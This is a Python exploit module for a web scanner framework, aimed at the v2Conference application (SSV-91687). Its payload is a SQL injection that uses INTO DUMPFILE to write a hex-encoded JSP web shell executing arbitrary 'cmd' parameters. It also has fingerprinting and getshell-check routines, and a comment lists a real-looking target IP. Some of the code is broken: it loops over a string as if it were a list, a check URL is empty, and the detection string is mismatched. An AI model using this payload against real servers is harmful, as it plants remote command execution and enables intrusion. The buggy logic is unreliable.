# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

# coding=utf-8
from async_timeout import timeout
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.asynchttp import *


class Script(BaseScript):
    name = 'WEB NAME'

    def __init__(self, target, pbar, semaphore):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.SQLINJECTION
        # 编号
        self.bugNumber = 'SSV-91687'
        # 来源
        self.refer = 'https://www.seebug.org/vuldb/ssvid-91687'
        # payload
        self.payloadList = "/Conf/jsp/systembulletin/bulletinAction.do?operator=modify&sysId=1 UNION SELECT 1,2,3,4,0x497420776F726B7321DA3C2540207061676520636F6E74656E74547970653D22746578742F68746D6C3B20636861727365743D47424B2220253EDA3C2540207061676520696D706F72743D226A6176612E696F2E2A2220253E203C2520537472696E6720636D64203D20726571756573742E676574506172616D657465722822636D6422293B20537472696E67206F7574707574203D2022223B20696628636D6420213D206E756C6C29207B20537472696E672073203D206E756C6C3B20747279207B2050726F636573732070203D2052756E74696D652E67657452756E74696D6528292E6578656328636D64293B204275666665726564526561646572207349203D206E6577204275666665726564526561646572286E657720496E70757453747265616D52656164657228702E676574496E70757453747265616D282929293B207768696C65282873203D2073492E726561644C696E6528292920213D206E756C6C29207B206F7574707574202B3D2073202B225C725C6E223B207D207D20636174636828494F457863657074696F6E206529207B20652E7072696E74537461636B547261636528293B207D207DDA6F75742E7072696E746C6E286F7574707574293B253EDA into dumpfile '../../management/webapps/root/V2ConferenceCmd.jsp'%23"
        # 特定路径判断
        self.detectPathList = ['/Conf/images/user.gif']
        # 进度条
        self.pbar = pbar
        # 信号量
        self.semaphore = semaphore
        # http://122.228.226.68:18080/Conf/images/user.gif

    async def detect(self):
        for detectPath in self.detectPathList:
            url = f'http://{self.target}{detectPath}' if self.target.startswith(
                ('http:', 'https:')) is False else f'{self.target}{detectPath}'
            try:
                async with self.semaphore:
                    with timeout(15):
                        async with aiohttp.ClientSession() as session:
                            text = await AsyncFetcher.fetch(session=session, url=url)
                            if 'FineReport--Web Reporting Tool' in text:
                                tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url))
                                self.flag = True
                                return {'name': 'v2Conference Finger', 'url': url, 'software': 'v2Conference'}
            except Exception:
                pass

    async def exploit(self):
        for payload in self.payloadList:
            url = f'http://{self.target}{payload}' if self.target.startswith(
                ('http:', 'https:')) is False else f'{self.target}{payload}'
            async with aiohttp.ClientSession() as session:
                text = await AsyncFetcher.fetch(session=session, url=url)
            url2 = ''
            async with aiohttp.ClientSession() as session:
                text2 = await AsyncFetcher.fetch(session=session, url=url2)
                if 'It works!' in text:
                    tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url2))
                    self.flag = True
                    return {'name': 'v2Conference Getshell', 'url': url2, 'software': 'v2Conference'}

    async def attack(self):
        a = await self.detect()
        self.vulList.append(a)
        if self.flag:
            b = await self.exploit()
            self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList

    # def attack(self):
    #     check_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '/V2ConferenceCmd.jsp', '', '', ''))
    #     temp = urlunparse((urlinfo.scheme, urlinfo.netloc, '', '', '', ''))
    #     exp_url = temp + exp
    #     try:
    #         var = "[checking] " + url
    #         req = requests.session()
    #         resp_one = req.get(exp_url, timeout=5)
    #         time.sleep(1)
    #         if resp_one.status_code == 200:
    #             resp_two = req.get(check_url, timeout=5)
    #             if resp_two.status_code == 200 and "It works!" in resp_two.content:
    #                 print("[getshell success]")
    #                 print("SHELL: " + check_url)
    #                 return
    #         print(u"getshell failed...")
    #         return
    #     except Exception as e:
    #         print("Failed to connection target, try again..")
